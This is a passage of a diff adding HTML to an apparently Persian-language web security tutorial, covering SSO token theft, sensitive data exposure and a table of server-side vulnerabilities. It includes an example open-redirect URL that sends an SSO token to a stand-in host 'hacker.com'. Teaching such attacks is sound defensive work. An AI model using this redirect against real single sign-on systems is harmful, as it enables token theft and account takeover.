+<span class="cmt">// دزدیدن توکن از طریق SSO</span>
+https://target.com/sso?continue=https://hacker.com
+<span class="cmt">// نتیجه: https://hacker.com/?token=lvxcjbh...</span></pre>
+    </div>
+
+    <!-- Sensitive Data Exposure -->
+    <hr class="divider" style="margin: 32px 0;">
+    <h3 class="sub-title">Sensitive Data Exposure — افشای داده حساس</h3>
+    <div class="callout danger">
+      اطلاعات حساس در سمت کلاینت نمایش داده شده و به درستی مدیریت نمی‌شود.
+    </div>
+    <ul class="styled-list">
+      <li><strong>PII</strong> — Personally Identifiable Information: نام، ایمیل، کد ملی، شماره کارت</li>
+      <li>ذخیره رمز عبور در localStorage یا کوکی بدون رمزنگاری</li>
+      <li>نمایش اطلاعات حساس در HTML Source یا JavaScript</li>
+      <li>ارسال اطلاعات از طریق پارامتر GET در URL</li>
+    </ul>
+  </div>
+
+  <hr class="divider">
+
+  <!-- SECTION 6: Server Side -->
+  <div class="section" id="server-side">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2 class="section-title">آسیب‌پذیری‌های سرورساید</h2>
+    </div>
+
+    <div class="callout">
+      حملاتی که سرور، پایگاه داده یا زیرساخت را تحت تأثیر قرار می‌دهند — بسیار خطرناک‌تر از حملات کلاینت‌ساید.
+    </div>
+
+    <table class="glossary-table" style="margin-top:20px;">
+      <thead>
+        <tr><th>آسیب‌پذیری</th><th>توضیح</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>SQL Injection</td><td>تزریق دستورات SQL به ورودی‌ها برای دستکاری پایگاه داده — استخراج یا حذف داده</td></tr>
+        <tr><td>Command Injection</td><td>تزریق دستورات OS به ورودی‌ها برای اجرا روی سرور (مثل ls, cat, rm)</td></tr>
+        <tr><td>Shell Upload</td><td>آپلود فایل PHP مخرب برای کنترل سرور از راه دور — تغییر محتوای سایت</td></tr>
+        <tr><td>SSRF</td><td>مجبور کردن سرور به درخواست به منابع داخلی — دسترسی به metadata cloud
